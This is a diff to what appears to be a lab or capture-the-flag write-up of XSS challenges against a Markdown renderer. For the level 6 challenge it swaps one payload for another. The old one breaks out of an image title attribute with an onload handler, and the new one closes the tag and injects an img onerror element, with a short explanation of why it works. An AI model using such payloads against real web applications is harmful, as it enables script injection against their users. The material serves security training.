@@ -39,7 +39,7 @@ Markdown renderer bugs: missing scheme checks, raw HTML pass-through, unescaped 
 
 ### markdown-level6
 
-`/markdown/level6/?title=x%22%20onload=alert(1)%20x=%22`
+`/markdown/level6/?title=%22%3E%3Cimg%20src=x%20onerror=alert(1)%3E`
 
-- payload: `x" onload=alert(1) x="`
-- context: markdown image title field reflected unescaped into `<img title="...">`
+- payload: `"><img src=x onerror=alert(1)>`
+- context: a `"` breaks the image regex, so the raw markdown line lands in the body
